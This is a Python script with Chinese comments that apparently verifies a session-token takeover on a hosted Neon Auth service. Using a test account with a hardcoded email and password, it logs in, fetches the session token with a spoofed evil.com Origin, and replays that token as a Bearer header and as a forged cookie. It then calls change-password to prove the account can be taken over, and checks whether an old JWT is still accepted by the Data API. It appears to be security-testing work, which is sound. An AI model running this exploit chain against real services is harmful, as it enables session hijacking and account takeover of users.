# -*- coding: utf-8 -*-
"""session token 接管链验证: 泄露的 token 能否冒充受害者做状态变更
+ 旧 JWT 有效性补测(404 vs 401 区分)"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
DA_HOST = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
EMAIL = 'libobo1229+na2@gmail.com'
PWD = 'SecTest!2026pass2'

def req(host, method, path, body=None, headers=None, origin=None, raw_headers=False):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
    if origin is not None:
        h['Origin'] = origin
    if headers:
        h.update(headers)
    conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse()
    data = r.read()
    st = r.status
    hdrs = r.headers
    conn.close()
    if raw_headers:
        return st, data, hdrs
    return st, data

# 1. 登录(模拟受害者)
st, raw, hdrs = req(NA, 'POST', '/neondb/auth/sign-in/email', {'email': EMAIL, 'password': PWD},
                    origin='http://localhost:3000', raw_headers=True)
cook = '; '.join(c.split(';')[0] for c in hdrs.get_all('set-cookie'))
print('victim login=%d' % st)

# 2. 攻击者跨站读取 get-session(evil origin,老浏览器场景)
st, raw = req(NA, 'GET', '/neondb/auth/get-session', headers={'Cookie': cook}, origin='https://evil.com')
sess = json.loads(raw)['session']
stolen = sess['token']
print('[attacker] evil-origin get-session -> %d' % st)
print('  stolen session token: %s...' % stolen[:24])

# 3. 用 stolen token 冒充: 三种认证形式
print('\n=== 冒充验证 ===')
# 3a. Bearer
st, raw = req(NA, 'GET', '/neondb/auth/get-session', headers={'Authorization': 'Bearer ' + stolen})
print('  Bearer get-session -> %d body=%s' % (st, raw.decode(errors='replace')[:120]))
# 3b. 伪造 cookie
st, raw = req(NA, 'GET', '/neondb/auth/get-session', headers={'Cookie': '__Secure-neon-auth.session_token=' + stolen})
print('  cookie get-session -> %d body=%s' % (st, raw.decode(errors='replace')[:120]))
# 3c. 状态变更(change-password 同密码——零破坏,证明账户接管能力)
st, raw = req(NA, 'POST', '/neondb/auth/change-password',
              {'currentPassword': PWD, 'newPassword': PWD},
              headers={'Cookie': '__Secure-neon-auth.session_token=' + stolen},
              origin='http://localhost:3000')
print('  cookie change-password -> %d body=%s' % (st, raw.decode(errors='replace')[:100]))
# 3d. 登录恢复后的新 session 对照(确认 3c 没破坏会话)
st, raw, hdrs = req(NA, 'POST', '/neondb/auth/sign-in/email', {'email': EMAIL, 'password': PWD},
                    origin='http://localhost:3000', raw_headers=True)
print('  relogin after impersonation -> %d (密码未被改坏)' % st)

# 4. 旧 JWT 有效性补测(404=有效仅表不存在; 401=已失效)
print('\n=== 旧 JWT 状态 ===')
j1 = json.loads(req(NA, 'GET', '/neondb/auth/token', headers={'Cookie': cook})[1]).get('token')
time.sleep(2)
st, raw = req(DA_HOST, 'GET', '/neondb/rest/v1/zz_no_such_table?limit=1',
              headers={'Authorization': 'Bearer ' + j1})
print('  DataAPI 旧JWT /zz_no_such_table -> %d %s' % (st, raw.decode(errors='replace')[:90]))
st, raw = req(DA_HOST, 'GET', '/neondb/rest/v1/zz_no_such_table?limit=1')
print('  DataAPI 无JWT -> %d %s' % (st, raw.decode(errors='replace')[:90]))
